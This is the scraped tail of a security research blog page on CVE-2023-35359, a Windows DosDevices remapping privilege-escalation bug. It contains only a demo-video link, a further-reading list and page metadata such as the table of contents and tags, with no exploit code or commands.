[CVE-2023-35359 - Analysis](https://y3a.github.io/2023/08/24/cve-2023-35359/)\n\n## Demo Video\n\n\u003chttps://www.youtube.com/embed/QaoLpTBHERM\u003e\n\n## Further Reading\n\n* [The Print Spooler Bug that Wasn't in the Print Spooler](https://www.youtube.com/watch?v=H03b0UaogVs)\n* [SSD Advisory – File History Service (fhsvc.dll) Elevation of Privilege](https://ssd-disclosure.com/ssd-advisory-file-history-service-fhsvc-dll-elevation-of-privilege/)\n* [Windows: System Drive Replacement During Impersonation EoP](https://bugs.chromium.org/p/project-zero/issues/detail?id=2451)\n* [CVE-2023-35359 - Analysis](https://y3a.github.io/2023/08/24/cve-2023-35359/)\n* [Activation Context Cache Poisoning - Exploiting Csrss For Privilege Escalation](https://www.zerodayinitiative.com/blog/2023/1/23/activation-context-cache-poisoning-exploiting-csrss-for-privilege-escalation)\n* [Windows Drivers are True'ly Tricky](https://googleprojectzero.blogspot.com/2015/10/windows-drivers-are-truely-tricky.html)\n* [DosDevices](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-ms-dos-device-names)\n* [SxS Assemblies](https://learn.microsoft.com/en-us/windows/win32/sbscs/about-side-by-side-assemblies-)\n* [Activation Context](https://learn.microsoft.com/en-us/windows/win32/sbscs/activation-contexts)\n* [WinSxS](https://omnicognate.wordpress.com/2009/10/05/winsxs/)\n"])</script><script>self.__next_f.push([1,"b:[[\"$\",\"div\",null,{\"className\":\"-mt-6\",\"children\":[\"$\",\"$L18\",null,{\"className\":\"mb-8\",\"children\":[\"$\",\"h1\",null,{\"className\":\"text-3xl md:text-4xl font-bold bg-gradient-to-r from-primary to-secondary bg-clip-text text-transparent\",\"children\":\"Activation Context Hell - DosDevices Remapping Attack under Impersonation\"}]}]}],[\"$\",\"$L19\",null,{\"slug\":\"activation-context-hell-dosdevices-remapping-attack-under-impersonation\",\"frontmatter\":{\"title\":\"Activation Context Hell - DosDevices Remapping Attack under Impersonation\",\"date\":\"September 11, 2023\",\"authors\":[\"Ashfaq Ansari\",\"Krishnakant Patil\"],\"excerpt\":\"The article delves into the complexities of the DosDevices remapping attack when carried out under impersonation. It sheds light on the nuances of activation context and how it plays a pivotal role in the exploitation process. (CVE-2023-35359)\",\"tags\":[\"activation context\",\"dosdevices\",\"impersonation\",\"lpe\",\"csrss\",\"sxs assembly\",\"windows exploitation\",\"symbolic link\",\"CVE-2015-1644\",\"CVE-2022-22047\",\"CVE-2022-37987\",\"CVE-2022-37989\",\"CVE-2023-35359\"]},\"content\":\"$1a\",\"tocItems\":[{\"id\":\"overview\",\"text\":\"Overview\",\"depth\":2},{\"id\":\"dosdevices\",\"text\":\"DosDevices\",\"depth\":2},{\"id\":\"loadlibrary\",\"text\":\"LoadLibrary\",\"depth\":2},{\"id\":\"impersonation\",\"text\":\"Impersonation\",\"depth\":2},{\"id\":\"clientserver-runtime-subsystem-csrss\",\"text\":\"Client/Server Runtime Subsystem (CSRSS)\",\"depth\":2},{\"id\":\"side-by-side-assemblies\",\"text\":\"Side-by-Side Assemblies\",\"depth\":3},{\"id\":\"manifests\",\"text\":\"Manifests\",\"depth\":3},{\"id\":\"activation-context\",\"text\":\"Activation Context\",\"depth\":3},{\"id\":\"activation-context-cache\",\"text\":\"Activation Context Cache\",\"depth\":3},{\"id\":\"file-history-service---cve-2023-35359\",\"text\":\"File History Service - CVE-2023-35359\",\"depth\":2},{\"id\":\"bug-pattern\",\"text\":\"Bug Pattern\",\"depth\":3},{\"id\":\"the-vulnerability\",\"text\":\"The Vulnerability\",\"depth\":3},{\"id\":\"root-cause-analysis\",\"text\":\"Root Cause Analysis\",\"depth\":2},{\"id\":\"exploitation\",\"text\":\"Exploitation\",\"depth\":2},{\"id\":\"sxs-tracing\",\"text\":\"SxS Tracing\",\"depth\":2},{\"id\":\"patch\",\"text\":\"Patch\",\"depth\":2},{\"id\":\"demo-video\",\"text\":\"Demo Video\",\"depth\":2},{\"id\":\"further-reading\",\"text\":\"Further Reading\",\"depth\":2}]}]]\n"])</script><script>self.__next_f.push([1,"10:null\n"])</script><script>self.__next_f.push([1,"14:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\nf:null\n"])</script><script>self.__next_f.push([1,"17:{\"metadata\":[[\"$\",\"title\",\"0\",{\"children\":\"Activation Context Hell - DosDevices Remapping Attack under Impersonation | HackSys Inc Blog\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"The article delves into the complexities of the DosDevices remapping attack when carried out under impersonation. It sheds light on the nuances of activation context and how it plays a pivotal role in the exploitation process. (CVE-2023-35359)\"}],[\"$\",\"link\",\"2\",{\"rel\":\"manifest\",\"href\":\"/manifest.webmanifest\",\"crossOrigin\":\"$undefined\"}],[\"$\",\"meta\",\"3\",{\"name\":\"keywords\",\"content\":\"activation context, dosdevices, impersonation, lpe, csrss, sxs assembly, windows exploitation, symbolic link, CVE-2015-1644, CVE-2022-22047, CVE-2022-37987, CVE-2022-37989, CVE-2023-35359\"}],[\"$\",\"meta\",\"4\",{\"name\":\"script:ld+json\",\"content\":\"{\\\"@context\\\":\\\"https://schema.org\\\",\\\"@type\\\":\\\"Article\\\",\\\"headline\\\":\\\"Activation Context Hell - DosDevices Remapping Attack under Impersonation\\\",\\\"datePublished\\\":\\\"2023-09-11T00:00:00.000Z\\\",\\\"author\\\":{\\\"@type\\\":\\\"Person\\\",\\\"name\\\":\\\"Ashfaq Ansari\\\"},\\\"description\\\":\\\"The article delves into the complexities of the DosDevices remapping attack when carried out under impersonation. It sheds light on the nuances of activation context and how it plays a pivotal role in the exploitation process. (CVE-2023-35359)\\\",\\\"publisher\\\":{\\\"@type\\\":\\\"Organization\\\",\\\"name\\\":\\\"HackSys Inc\\\",\\\"logo\\\":{\\\"@type\\\":\\\"ImageObject\\\",\\\"url\\\":\\\"https://hacksys.io/logo.svg\\\"}},\\\"url\\\":\\\"https://hacksys.io/blogs/activation-context-hell-dosdevices-remapping-attack-under-impersonation\\\",\\\"mainEntityOfPage\\\":{\\\"@type\\\":\\\"WebPage\\\",\\\"@id\\\":\\\"https://hacksys.io/blogs/activation-context-hell-dosdevices-remapping-attack-under-impersonation\\\"}}\"}],[\"$\",\"link\",\"5\",{\"rel\":\"canonical\",\"href\":\"https://hacksys.io/blogs/activation-context-hell-dosdevices-remapping-attack-under-impersonation\"}],[\"$\",\"meta\",\"6\",{\"property\":\"og:title\",\"content\":\"Activation Context Hell - DosDevices Remapping Attack under Impersonation\"}],[\"$\",\"meta\",\"7\",{\"property\":\"og:description\",\"content\":\"The article delves into the complexities of the DosDevices remapping attack when carried out under impersonation. It sheds light on the nuances of activation context and how it plays a pivotal role in the exploitation process. (CVE-2023-35359)\"}],[\"$\",\"meta\",\"8\",{\"property\":\"og:url\",\"content\":\"https://hacksys.io/blogs/activation-context-hell-dosdevices-remapping-attack-under-impersonation\"}],[\"$\",\"meta\",\"9\",{\"property\":\"og:type\",\"content\":\"article\"}],[\"$\",\"meta\",\"10\",{\"property\":\"article:published_time\",\"content\":\"2023-09-11T00:00:00.000Z\"}],[\"$\",\"meta\",\"11\",{\"property\":\"article:author\",\"content\":\"Ashfaq Ansari\"}],[\"$\",\"meta\",\"12\",{\"name\":\"twitter:card\",\"content\":\"summary_large_image\"}],[\"$\",\"meta\",\"13\",{\"name\":\"twitter:title\",\"content\":\"Activation Context Hell - DosDevices Remapping Attack under Impersonation\"}],[\"$\",\"meta\",\"14\",{\"name\":\"twitter:description\",\"content\":\"The article delves into the complexities of the DosDevices remapping attack when carried out under impersonation. It sheds light on the nuances of activation context and how it plays a pivotal role in the exploitation process. (CVE-2023-35359)\"}]],\"error\":null,\"digest\":\"$undefined\"}\n"])</script><script>self.__next_f.push([1,"12:{\"metadata\":\"$17:metadata\",\"error\":null,\"digest\":\"$undefined\"}\n"])</script></body></html>